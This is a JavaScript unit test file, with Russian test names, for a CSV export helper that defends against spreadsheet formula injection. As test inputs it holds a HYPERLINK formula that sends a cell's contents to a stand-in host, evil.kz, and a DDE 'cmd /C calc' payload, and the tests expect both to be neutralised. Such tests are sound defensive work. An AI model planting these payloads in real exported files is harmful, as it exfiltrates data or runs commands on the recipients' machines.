// @vitest-environment node
import { describe, expect, test } from "vitest";
import { csvCell, toCsv } from "./csv";

describe("CSV: защита от инъекции формул", () => {
  test.each([
    ["=HYPERLINK(\"https://evil.kz/?d=\"&C2;\"Открыть\")", `"'=HYPERLINK(""https://evil.kz/?d=""&C2;""Открыть"")"`],
    ["+7 701 555 01 47", `"'+7 701 555 01 47"`],
    ["-2+3+cmd|' /C calc'!A0", `"'-2+3+cmd|' /C calc'!A0"`],
    ["@SUM(A1:A9)", `"'@SUM(A1:A9)"`],
    ["\t=1+1", `"'\t=1+1"`],
    ["\r\n=1+1", `"'\r\n=1+1"`],
    ["\nтекст", `"'\nтекст"`],
    ["  =1+1", `"'  =1+1"`],
    ["＝1+1", `"'＝1+1"`],
  ])("опасное начало получает апостроф: %j", (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  test("обычный текст, пустые значения и числа не меняются; формула в середине безопасна", () => {
    expect(csvCell("Иван Петров")).toBe(`"Иван Петров"`);
    expect(csvCell("Кв. 5 = угловая")).toBe(`"Кв. 5 = угловая"`);
    expect(csvCell('ТОО "Север"')).toBe(`"ТОО ""Север"""`);
    expect(csvCell(undefined)).toBe(`""`);
    expect(csvCell(null)).toBe(`""`);
    expect(csvCell(30000)).toBe(`"30000"`);
    expect(csvCell(-500)).toBe(`"-500"`);
    expect(csvCell(Number.NaN)).toBe(`""`);
  });

  test("файл: BOM для кириллицы, «;» между ячейками, CRLF между строками", () => {
    const csv = toCsv([
      ["Клиент", "Сумма"],
      ["=1+1", 1500],
    ]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv.slice(1)).toBe(`"Клиент";"Сумма"\r\n"'=1+1";"1500"`);
  });
});
